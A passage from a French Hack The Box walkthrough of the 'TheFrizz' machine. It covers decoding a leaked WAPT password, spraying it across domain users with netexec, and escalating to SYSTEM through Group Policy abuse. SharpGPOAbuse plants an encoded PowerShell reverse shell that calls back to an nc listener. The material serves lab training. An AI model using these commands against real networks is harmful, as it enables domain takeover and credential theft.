token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log


[root@exegol-htb] /workspace/TheFrizz/wapt/conf
❯ echo "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d
!suBcig@MehTed!R

```


### Password Spraying

Puis avec `netexec`, j’énumère les utilisateurs du domaine pour me faire une wordlist.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k --users | awk '{print($5)}'
[*]
[+]
-Username-
Administrator
Guest
krbtgt
f.frizzle
w.li
h.arm
M.SchoolBus
d.hudson
k.franklin
l.awesome
t.wright
r.tennelli
J.perlstein
a.perlstein
p.terese
v.frizzle
g.frizzle
c.sandiego
c.ramon
m.ramon
w.Webservice
[*]
```


Je teste alors le mot de passe sur tous ces utilisateurs et je vois que le mot de passe appartient à `M.SchoolBus`.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ nxc smb frizzdc.frizz.htb -u users.lst -p '!suBcig@MehTed!R' -k --continue-on-success
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Administrator:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Guest:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\krbtgt:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\w.li:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\h.arm:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\d.hudson:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\k.franklin:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\l.awesome:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\t.wright:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\r.tennelli:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\J.perlstein:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\a.perlstein:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\p.terese:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\v.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\g.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\c.sandiego:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\c.ramon:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\m.ramon:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\w.Webservice:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
```


**`M.SchoolBus`** possède tous les utilisateurs du domaine sauf l'administrateur.
![](/images/TheFrizz/TheFrizz-11.png)


Il est aussi membre du groupe **`REMOTE MANAGEMENT USERS`** qui lui permet d'avoir une shell sur la machine. Je vois aussi qu'il est membre du groupe **`GOUPE POLICY CREATOR OWNERS`** ce qui suggère qu'il est celui qui gère les GPO du domaine. Or le fait qu'il soit dans ce groupe peut être abusé pour permettre une élévation de privilèges en créant ou modifiant une GPO
![](/images/TheFrizz/TheFrizz-12.png)


### SSH

Je me connecte alors par SSH en tant que `M.SchoolBus`.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ ssh -K M.SchoolBus@frizzdc.frizz.htb                                                                                              ⏎
PowerShell 7.4.5
PS C:\Users\M.SchoolBus> whoami
frizz\m.schoolbus
PS C:\Users\M.SchoolBus> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
frizz\m.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106


GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes

============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```


## Shell en tant que system
### SharpGPOAbuse

Il n'y a que deux GPO.
```powershell
PS C:\ProgramData> Get-GPO -all

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:19:24 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :
```


Pour abuser de ce droit, je vais utiliser l'outils **`SharpGPOAbuse.exe`** qui peut être trouvé dans les exécutables de [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any). Je l'uploade sur la machine cible avec **`scp`**.
```shell
scp SharpGPOAbuse.exe 'M.SchoolBus@frizzdc.frizz.htb:C:/programdata/'
```


Plutôt que de modifier une GPO existante (qui est une mauvaise pratique), je préfère en créer une nouvelle pour l'exploiter. Cet [article](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-sharpgpoabuse) explique comment s'y prendre.
- Premièrement je crée la GPO que je nomme par mon pseudo
- Ensuite je la relie au domaine
- Enfin j'utilise **`SharpGPOAbuse.exe`** pour exécuter un reverse shell
```powershell
PS C:\ProgramData> New-GPO -Name "z3rodol"

DisplayName      : z3rodol
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : ae539f39-d154-4dfe-9a27-ec58f470050e
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 8/25/2025 4:25:08 PM
ModificationTime : 8/25/2025 4:25:08 PM
UserVersion      :
ComputerVersion  :
WmiFilter        :

PS C:\ProgramData> New-GPLink -Name "z3rodol" -Target "DC=FRIZZ,DC=HTB"

GpoId       : ae539f39-d154-4dfe-9a27-ec58f470050e
DisplayName : z3rodol
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2

PS C:\ProgramData> .\SharpGPOAbuse.exe --AddComputerTask --GPOName "z3rodol" --Author 'z3rodol' --TaskName "rvshell" --Command "powershell.exe" --Arguments  "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "z3rodol" is: {AE539F39-D154-4DFE-9A27-EC58F470050E}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{AE539F39-D154-4DFE-9A27-EC58F470050E}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\ProgramData> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```


J'obtiens ainsi un shell en tant que **`nt authority\system`**.
```powershell
[root@exegol-htb] /workspace/TheFrizz
❯ rlwrap nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.60.
Ncat: Connection from 10.10.11.60:55038.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
406e039636272b5abe59834d1b6618d2
```


![](https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp)
